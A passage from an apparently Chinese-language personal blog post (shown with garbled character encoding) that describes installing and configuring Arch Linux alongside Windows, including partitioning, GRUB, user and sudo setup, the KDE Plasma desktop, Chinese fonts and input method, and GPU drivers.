id="å»ºç«‹ç£ç›˜åˆ†åŒº"><a href="#å»ºç«‹ç£ç›˜åˆ†åŒº" class="headerlink" title="å»ºç«‹ç£ç›˜åˆ†åŒº"></a>å»ºç«‹ç£ç›˜åˆ†åŒº</h3><p>é¦–å…ˆä½¿ç”¨ <code>lsblk</code> æŸ¥çœ‹ç£ç›˜åˆ†åŒºï¼Œè¿™é‡Œçœ‹ä¸åˆ°æˆ‘ä»¬ä¹‹å‰æ–°åˆ’åˆ†çš„åŒºåŸŸï¼Œå› ä¸ºè¿˜æ²¡åˆ’åˆ†ä¸€ä¸ªæ–°çš„åˆ†åŒºï¼š</p><p><img src="https://s2.loli.net/2023/09/18/ram95FjtBEIuD7p.jpg"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ–°åˆ†åŒºçš„å»ºç«‹ï¼Œæ³¨æ„æ ¹æ®ä½ è‡ªå·±çš„ç£ç›˜è®¾å¤‡åè¿›è¡Œè¾“å…¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cfdisk /dev/nvme0n1</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ª <code>Free Space</code>ï¼Œé€‰ä¸­å¹¶é€‰æ‹© <code>[New]</code> å³å¯ï¼Œé»˜è®¤ç›´æ¥æ•²ä¸¤ä¸‹å›è½¦å°±æ˜¯ç”¨æ‰€æœ‰çš„ç©ºé—´ï¼Œä½ ä¹Ÿå¯ä»¥é€‰æ‹©æ‰‹åŠ¨è¾“å…¥è‡ªå·±æƒ³è¦åˆ’åˆ†çš„åˆ†åŒºå¤§å°ï¼Œå®Œæˆä¹‹ååœ¨ä¸‹é¢é€‰æ‹© <code>[Write]</code> ç„¶åè¾“å…¥ <code>yes</code> å³å¯ï¼š</p><p><img src="https://s2.loli.net/2023/09/18/EX81wkHmfjbWMF6.jpg"></p><p>æ¥ä¸‹æ¥å°†è¯¥åˆ†åŒºæ ¼å¼åŒ–ä¸º <code>ext4</code> æ ¼å¼ï¼Œè¿™é‡Œæ³¨æ„åˆ†åŒºåˆ«é€‰é”™äº†ï¼Œä¸è®°å¾—çš„å°±é‡æ–°å†çœ‹çœ‹ <code>lsblk</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p6</span><br></code></pre></td></tr></table></figure><h3 id="æ­£å¼å®‰è£…"><a href="#æ­£å¼å®‰è£…" class="headerlink" title="æ­£å¼å®‰è£…"></a>æ­£å¼å®‰è£…</h3><p>æ¥ä¸‹æ¥é¦–å…ˆæŒ‚è½½æ–°åˆ†åŒºï¼Œä¹‹ååœ¨å†…éƒ¨åˆ›å»º <code>/boot</code> ç›®å½•ï¼Œå¹¶å°† Windows åŸæœ‰çš„ EFI åˆ†åŒºæŒ‚è½½åˆ° <code>/boot</code> ç›®å½•ä¸‹ï¼Œè¿™é‡Œæ³¨æ„çœ‹è‡ªå·±å¯¹åº”çš„åˆ†åŒºåï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mount /dev/nvme0n1p6 /mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/boot</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">mount /dev/nvme0n1p1 /mnt/boot</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨è¯¥å‘½ä»¤è¿›è¡Œå®‰è£…åŸºæœ¬çš„ç¯å¢ƒï¼Œè¿™é‡Œç¬”è€…å®‰è£…é»˜è®¤çš„å†…æ ¸ç‰ˆæœ¬ <code>linux</code>ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨ <a href="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8">Wiki</a> ä¸Šé€‰æ‹©è‡ªå·±æƒ³è¦çš„å†…æ ¸ï¼ˆæ¯”å¦‚è¯´å¸¦æœ‰å®‰å…¨åŠ å›ºçš„ <code>linux-hardened</code>ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacstrap /mnt base linux linux-firmware</span><br></code></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆä¹‹åæ¥ä¸‹æ¥æˆ‘ä»¬æ¥å¯¹ç³»ç»Ÿè¿›è¡Œä¸€äº›åŸºæœ¬é…ç½®ï¼Œé¦–å…ˆæ˜¯ç”Ÿæˆ fstabï¼ˆæ–‡ä»¶ç³»ç»Ÿè¡¨ï¼‰æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨ <code>arch-chroot</code> å‘½ä»¤åˆ‡æ¢åˆ°æ–°çš„ç³»ç»Ÿç¯å¢ƒä¸­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">arch-chroot /mnt</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯è®¾ç½®æ—¶åŒºï¼Œç¬”è€…ç°åœ¨åœ¨å¢¨å°”æœ¬æ‰€ä»¥æ—¶åŒºè®¾ç½®ä¸ºå¢¨å°”æœ¬ï¼Œå¦‚æœä½ åœ¨ä¸­å›½å¤§é™†åˆ™éœ€è¦è®¾ç½®ä¸º <code>Asia/Shanghai</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç”Ÿæˆ <code>/etc/adjtime</code> æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hwclock --systohc</span><br></code></pre></td></tr></table></figure><p>ç„¶ååˆ›å»ºä¸»æœºåï¼Œè¿™é‡Œå°±éšä¾¿äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3-Arch&quot;</span> &gt; /etc/hostname</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>/etc/hosts</code> ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼Œè¿™é‡Œæ³¨æ„æ”¹æˆè‡ªå·±çš„ hostnameï¼š</p><p><img src="https://s2.loli.net/2023/09/18/hdjHysTvP8KlqA4.png"></p><p>è®¾ç½® root å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">passwd</span><br></code></pre></td></tr></table></figure><p>å®‰è£…ä¸€äº›åŸºæœ¬çš„è½¯ä»¶åŒ…ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ <code>grub</code> ä½œä¸ºå¯åŠ¨å™¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S grub efibootmgr networkmanager network-manager-applet dialog wireless_tools wpa_supplicant os-prober mtools dosfstools ntfs-3g base-devel linux-headers reflector git sudo vim</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S intel-ucode <span class="hljs-comment"># å¦‚æœä½ æ˜¯ AMD åˆ™éœ€è¦æ”¹æˆ amd-ucode</span></span><br></code></pre></td></tr></table></figure><p>é…ç½® GRUB è‡ªåŠ¨å¯ç”¨ <code>os-prober</code>ï¼Œè¿™é‡Œåªéœ€è¦åœ¨ <code>/etc/default/grub</code> ä¸­åŠ å…¥ä¸€è¡Œ <code>GRUB_DISABLE_OS_PROBER=false</code> ï¼Œå¹¶è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><p>åˆ°è¿™ä¸€æ­¥ä¸€ä¸ªåŸºæœ¬çš„ Arch ç¯å¢ƒå°±å®‰è£…å¥½äº†ï¼Œå®Œæˆä¹‹åè¾“å…¥å¦‚ä¸‹å‘½ä»¤è¿›è¡Œé‡å¯è¿›å…¥ç³»ç»Ÿï¼Œåˆ«å¿˜äº†æ‹”å‡ºç§»åŠ¨å®‰è£…ä»‹è´¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">exit</span>        <span class="hljs-comment"># é€€å‡º arch-chroot</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">umount -a   <span class="hljs-comment"># å–æ¶ˆåˆ†åŒºæŒ‚è½½</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">reboot      <span class="hljs-comment"># é‡å¯</span></span><br></code></pre></td></tr></table></figure><blockquote><p>åé¢å¦‚æœæƒ³å†è¿›å…¥ Windows åªéœ€è¦è¿› BIOS è°ƒæ•´å¯åŠ¨é¡ºåºå³å¯</p></blockquote><h1 id="0x03-å¸¸è§„ç³»ç»Ÿé…ç½®"><a href="#0x03-å¸¸è§„ç³»ç»Ÿé…ç½®" class="headerlink" title="0x03. å¸¸è§„ç³»ç»Ÿé…ç½®"></a>0x03. å¸¸è§„ç³»ç»Ÿé…ç½®</h1><p>æ¥ä¸‹æ¥æ˜¯ä¸€äº›å¸¸è§„ç³»ç»Ÿé…ç½®ï¼ŒåŒ…æ‹¬æ–°å»ºç”¨æˆ·ã€é…ç½® GUI ç­‰</p><h3 id="å¯åŠ¨ç½‘ç»œ"><a href="#å¯åŠ¨ç½‘ç»œ" class="headerlink" title="å¯åŠ¨ç½‘ç»œ"></a>å¯åŠ¨ç½‘ç»œ</h3><p>é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯åŠ¨ç½‘ç»œå¹¶è¿æ¥ WiFiï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> --now NetworkManager</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmtui</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥è¿™ä¸ªç•Œé¢åé€‰ <code>Activate a connection</code>ï¼Œç„¶åå°±æ­£å¸¸é€‰ WiFi è¾“å¯†ç è¿æ¥å°±è¡Œï¼Œè¿™ä¸ªåªç”¨æœ€å¼€å§‹çš„æ—¶å€™å¼„ä¸€æ¬¡ï¼š</p><p><img src="https://s2.loli.net/2023/09/18/34f1eJYGojnX2xq.jpg"></p><p>DHCP ç›¸å…³çš„ä¸€äº›é…ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S dhcpcd</span><br></code></pre></td></tr></table></figure><h3 id="bash-è‡ªåŠ¨è¡¥å…¨"><a href="#bash-è‡ªåŠ¨è¡¥å…¨" class="headerlink" title="bash è‡ªåŠ¨è¡¥å…¨"></a>bash è‡ªåŠ¨è¡¥å…¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S bash-completion</span><br></code></pre></td></tr></table></figure><h3 id="è®¾ç½®-Locale-è¿›è¡Œæœ¬åœ°åŒ–"><a href="#è®¾ç½®-Locale-è¿›è¡Œæœ¬åœ°åŒ–" class="headerlink" title="è®¾ç½® Locale è¿›è¡Œæœ¬åœ°åŒ–"></a>è®¾ç½® Locale è¿›è¡Œæœ¬åœ°åŒ–</h3><p>å»æ‰ <code>/etc/locale.gen</code> ä¸­ <code>en_US.UTF-8</code> æ‰€åœ¨è¡Œä»¥åŠ <code>zh_CN.UTF-8</code> æ‰€åœ¨è¡Œå¼€å¤´çš„ <code>#</code>ï¼Œç„¶ååœ¨ <code>/etc/locale.conf</code> ä¸­å†™å…¥ä¸€è¡Œ <code>LANG=en_US.UTF-8</code> å³å¯</p><h3 id="åˆ›å»ºæ–°ç”¨æˆ·"><a href="#åˆ›å»ºæ–°ç”¨æˆ·" class="headerlink" title="åˆ›å»ºæ–°ç”¨æˆ·"></a>åˆ›å»ºæ–°ç”¨æˆ·</h3><p>æ²¡å•¥å¥½è¯´çš„ï¼Œè€ä¸€å¥—ä¸œè¥¿ï¼Œè¿™é‡Œåˆ«å¿˜äº†æ”¹æˆè‡ªå·±çš„ç”¨æˆ·åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">groupadd arttnba3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">useradd -m -s /bin/bash -g arttnba3 arttnba3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">passwd arttnba3</span><br></code></pre></td></tr></table></figure><p>æˆäºˆ sudo æƒé™ï¼Œè¿™é‡Œæ³¨æ„æˆ‘ä»¬<strong>åº”å½“ä¸”ä»…åº”å½“ä½¿ç”¨ visudoï¼Œè€Œéç›´æ¥ç¼–è¾‘ &#x2F;etc&#x2F;sudoers æ–‡ä»¶</strong>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">usermod -aG wheel arttnba3 <span class="hljs-comment"># arch ä¸‹çš„ sudo ç»„</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">EDITOR=vim visudo</span><br></code></pre></td></tr></table></figure><p>å»æ‰å¦‚ä¸‹å›¾æ‰€ç¤ºè¿™ä¸€è¡Œçš„å‰é¢çš„ <code>#</code> æ³¨é‡Šå³å¯ï¼Œç¬”è€…è¿™é‡Œæ˜¯å·²ç»ä¿®æ”¹è¿‡åçš„ç‰ˆæœ¬ï¼š</p><p><img src="https://s2.loli.net/2023/09/18/dpNtu5qs4hCGSmD.png"></p><h3 id="é…ç½®æ¡Œé¢ç¯å¢ƒ"><a href="#é…ç½®æ¡Œé¢ç¯å¢ƒ" class="headerlink" title="é…ç½®æ¡Œé¢ç¯å¢ƒ"></a>é…ç½®æ¡Œé¢ç¯å¢ƒ</h3><p>ç¬”è€…é€‰æ‹©å®‰è£… <code>XWayland + KDE Plasma</code>ï¼Œé¦–å…ˆå®‰è£…åŸºæœ¬çš„ KDE Plasma æ¡Œé¢ç»„ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S plasma-meta konsole dolphin</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> sddm</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S egl-wayland kde-applications-meta sway alacritty waybar wofi xorg-xwayland xorg-xlsclients qt5-wayland glfw-wayland</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¼šæœ‰ä¸€äº›ä¸åŒçš„ provider ä¾›é€‰æ‹©ï¼ŒæŒ‰è‡ªå·±å–œæ¬¢çš„é€‰å°±å¥½ï¼š</p><p><img src="https://s2.loli.net/2023/09/19/XRjHPuoTIzFxUdB.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ KDE <a href="https://community.kde.org/Distributions/Packaging_Recommendations#Non-Plasma_packages">ä»…æ¨èVLCåç«¯</a>ï¼Œå› ä¸ºGStreamer<a href="https://invent.kde.org/libraries/phonon-gstreamer/-/issues/1">ä¸å†ç»´æŠ¤</a>ï¼š</p></blockquote><p>ä¹‹åé‡å¯å°±èƒ½è¿›å›¾å½¢åŒ–çš„æ¡Œé¢äº†ï¼Œè¯´å®è¯æœ‰ç‚¹ä¸‘ ï¼š(</p><p><img src="https://s2.loli.net/2023/09/19/W1q4dgVSibDeF2t.jpg"></p><p>é…ç½®é»˜è®¤å¼€å¯å°é”®ç›˜åªéœ€è¦åœ¨ <code>/etc/sddm.conf</code> æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[General]<br>Numlock=on<br></code></pre></td></tr></table></figure><h3 id="å¼€å¯-32-ä½æ”¯æŒåº“"><a href="#å¼€å¯-32-ä½æ”¯æŒåº“" class="headerlink" title="å¼€å¯ 32 ä½æ”¯æŒåº“"></a>å¼€å¯ 32 ä½æ”¯æŒåº“</h3><p>å°† <code>/etc/pacman.conf</code> ä¸­ <code>[multilib]</code> æ‰€åœ¨çš„é‚£ä¸¤è¡Œå¼€å¤´çš„ <code>#</code>å»æ‰ï¼Œç„¶å <code>pacman -Syyu</code> å³å¯</p><h3 id="æ›´æ¢åŒ…ç®¡ç†å™¨ä¸º-AUR"><a href="#æ›´æ¢åŒ…ç®¡ç†å™¨ä¸º-AUR" class="headerlink" title="æ›´æ¢åŒ…ç®¡ç†å™¨ä¸º AUR"></a>æ›´æ¢åŒ…ç®¡ç†å™¨ä¸º AUR</h3><p>ç…§ç€æ–‡æ¡£åšå°±è¡Œï¼Œè¿™é‡Œç¬”è€…å°±æ‡’å¾—è‡ªå·±ç¼–è¯‘äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S --needed git base-devel</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://aur.archlinux.org/yay-bin.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> yay-bin</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">makepkg -si</span><br></code></pre></td></tr></table></figure><h3 id="ç¦ç”¨-iwd"><a href="#ç¦ç”¨-iwd" class="headerlink" title="ç¦ç”¨ iwd"></a>ç¦ç”¨ iwd</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">disable</span> iwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl stop iwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now NetworkManager</span><br></code></pre></td></tr></table></figure><h3 id="åŸºç¡€åŠŸèƒ½åŒ…ä¸ä¸­æ–‡å­—ä½“å®‰è£…"><a href="#åŸºç¡€åŠŸèƒ½åŒ…ä¸ä¸­æ–‡å­—ä½“å®‰è£…" class="headerlink" title="åŸºç¡€åŠŸèƒ½åŒ…ä¸ä¸­æ–‡å­—ä½“å®‰è£…"></a>åŸºç¡€åŠŸèƒ½åŒ…ä¸ä¸­æ–‡å­—ä½“å®‰è£…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S sof-firmware alsa-firmware alsa-ucm-conf          <span class="hljs-comment"># ä¸€äº›å¯èƒ½éœ€è¦çš„å£°éŸ³å›ºä»¶</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S adobe-source-han-serif-cn-fonts wqy-zenhei        <span class="hljs-comment"># å¼€æºä¸­æ–‡å­—ä½“</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S noto-fonts-cjk noto-fonts-emoji noto-fonts-extra  <span class="hljs-comment"># è°·æ­Œå¼€æºå­—ä½“åŠè¡¨æƒ…</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S ark</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S p7zip unrar unarchiver lzop lrzip                 <span class="hljs-comment"># ark çš„å¯é€‰ä¾èµ–</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S google-chrome</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S packagekit-qt5 packagekit appstream-qt appstream gwenview wget kate <span class="hljs-built_in">bind</span> <span class="hljs-comment"># å›¾ç‰‡æŸ¥çœ‹å™¨å’Œå…¶ä»–å·¥å…·ç­‰</span></span><br></code></pre></td></tr></table></figure><h3 id="å®‰è£…ä¸­æ–‡è¾“å…¥æ³•"><a href="#å®‰è£…ä¸­æ–‡è¾“å…¥æ³•" class="headerlink" title="å®‰è£…ä¸­æ–‡è¾“å…¥æ³•"></a>å®‰è£…ä¸­æ–‡è¾“å…¥æ³•</h3><p>ç¬”è€…ç”¨çš„ fcitxï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-im</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-chinese-addons <span class="hljs-comment"># ä¸­æ–‡è¾“å…¥å¼•æ“</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-pinyin-zhwiki  <span class="hljs-comment"># ä¸­æ–‡ç»´åŸºç™¾ç§‘è¯åº“</span></span><br></code></pre></td></tr></table></figure><p>ä¹‹åä½¿ç”¨ <code>EDITOR=vim sudoedit /etc/environment</code> å‘½ä»¤åœ¨å¯¹åº”æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">GTK_IM_MODULE=fcitx<br>QT_IM_MODULE=fcitx<br>XMODIFIERS=@im=fcitx<br>SDL_IM_MODULE=fcitx<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ç³»ç»Ÿè®¾ç½®é‡Œä¾¿å¯è¿›è¡Œç›¸åº”çš„é…ç½®</p><h3 id="å¯ç”¨è“ç‰™å¹¶å®‰è£…è“ç‰™éŸ³é¢‘è®¾å¤‡"><a href="#å¯ç”¨è“ç‰™å¹¶å®‰è£…è“ç‰™éŸ³é¢‘è®¾å¤‡" class="headerlink" title="å¯ç”¨è“ç‰™å¹¶å®‰è£…è“ç‰™éŸ³é¢‘è®¾å¤‡"></a>å¯ç”¨è“ç‰™å¹¶å®‰è£…è“ç‰™éŸ³é¢‘è®¾å¤‡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S bluez bluez-utils</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now bluetooth</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S pulseaudio-bluetooth</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pulseaudio -k</span><br></code></pre></td></tr></table></figure><h3 id="å®‰è£…æ˜¾å¡é©±åŠ¨"><a href="#å®‰è£…æ˜¾å¡é©±åŠ¨" class="headerlink" title="å®‰è£…æ˜¾å¡é©±åŠ¨"></a>å®‰è£…æ˜¾å¡é©±åŠ¨</h3><p>é¦–å…ˆå®‰è£… Intel æ ¸æ˜¾é©±åŠ¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel</span><br></code></pre></td></tr></table></figure><p>å¦‚æœä½ å’Œç¬”è€…ä¸€æ ·è¿˜æœ‰ä¸€å¼  N å¡åˆ™ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…é©±åŠ¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S nvidia nvidia-settings lib32-nvidia-utils</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œç¬”è€…æ²¡æœ‰å®‰è£… <code>optimus-manager</code>ï¼Œ å› ä¸ºä¸€å®‰å°±è¿›ä¸å»æ¡Œé¢äº†ï¼Œçœ‹äº†åŠå¤©æ—¥å¿—æ‰¾äº†åŠå¤©è§£å†³æ–¹æ¡ˆéƒ½æ²¡èƒ½è§£å†³ï¼ˆæ‚²ï¼‰</p><p>å› ä¸ºç›®å‰å¯¹ç»­èˆªå…¶å®æ²¡æœ‰è¿‡äºæé™çš„è¦æ±‚ï¼Œç‹¬æ˜¾é›†æ˜¾æ··åˆè¾“å‡ºçš„æƒ…å†µä¸‹è¿˜æ˜¯èƒ½è½»åº¦å·¥ä½œ3hå·¦å³çš„ï¼Œå› æ­¤æš‚æ—¶ä¸è€ƒè™‘ç»§ç»­æ•´è¿™ç©æ„äº†ï¼šï¼‰</p></blockquote><h1 id="0x04-æ¡Œé¢ç¾åŒ–"><a href="#0x04-æ¡Œé¢ç¾åŒ–" class="headerlink" title="0x04. æ¡Œé¢ç¾åŒ–"></a>0x04. æ¡Œé¢ç¾åŒ–</h1><h3 id="å¯åŠ¨ç•Œé¢ç¾åŒ–"><a href="#å¯åŠ¨ç•Œé¢ç¾åŒ–" class="headerlink" title="å¯åŠ¨ç•Œé¢ç¾åŒ–"></a>å¯åŠ¨ç•Œé¢ç¾åŒ–</h3><p>ç›´æ¥åœ¨ <code>System Settings-&gt;Startup and Shutdown-&gt;Login Screen(SDDM)</code> é‡Œå°±èƒ½æ”¹ï¼Œç¬”è€…è¿™é‡Œç›´æ¥é€‰äº† <code>Breeze</code></p><h3 id="æ¡Œé¢é£æ ¼ç¾åŒ–"><a href="#æ¡Œé¢é£æ ¼ç¾åŒ–" class="headerlink" title="æ¡Œé¢é£æ ¼ç¾åŒ–"></a>æ¡Œé¢é£æ ¼ç¾åŒ–</h3><p>ç›´æ¥åœ¨ <code>System Settings-&gt;Appearance-&gt;Global Theme</code> é‡Œé€‰æ‹©è‡ªå·±å–œæ¬¢çš„ä¸»é¢˜å®‰è£…ä¸Šç„¶åå† apply å°±è¡Œï¼Œæˆ–è€…ä¹Ÿå¯ä»¥è‡ªå·±å» <a href="https://store.kde.org/">https://store.kde.org</a> è¿›è¡Œä¸‹è½½ï¼Œç¬”è€…é€‰æ‹©çš„æ˜¯å›½äººè®¾è®¡å¸ˆ <a href="https://github.com/vinceliuice">vinceliuice</a> å¼€å‘çš„ <a href="https://github.com/vinceliuice/MacVentura-kde">MacVentura KDE theme</a> ä¸»é¢˜</p><h3 id="å®‰è£…-Dock"><a href="#å®‰è£…-Dock" class="headerlink" title="å®‰è£… Dock"></a>å®‰è£… Dock</h3><p>åœ¨åº•ä¸‹æœ‰ä¸ª Mac æ ·å¼çš„ Dock 